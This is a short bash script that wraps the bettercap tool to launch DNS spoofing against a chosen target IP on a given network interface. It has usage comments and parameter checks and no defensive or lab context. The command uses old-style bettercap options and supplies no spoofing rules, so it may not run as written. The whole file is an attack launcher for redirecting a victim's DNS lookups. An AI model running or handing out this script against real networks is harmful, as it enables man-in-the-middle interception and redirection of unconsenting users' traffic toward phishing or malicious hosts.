#!/bin/bash
# Bettercap - DNS Spoofing
# Options:
# -I : Interface to use
# -T : Target IP address

# Usage: bettercap_dns_spoof.sh <interface> <target_ip>
# Example script
# bettercap_dns_spoof.sh eth0 192.168.1.10

# Check if bettercap is installed
if ! command -v bettercap &> /dev/null
then
    echo "bettercap could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <interface> <target_ip>"
    exit 1
fi

INTERFACE=$1
TARGET_IP=$2

echo "Starting DNS spoofing on interface $INTERFACE targeting $TARGET_IP"

# Perform DNS spoofing
bettercap -I $INTERFACE -T $TARGET_IP --dns

echo "DNS spoofing completed."
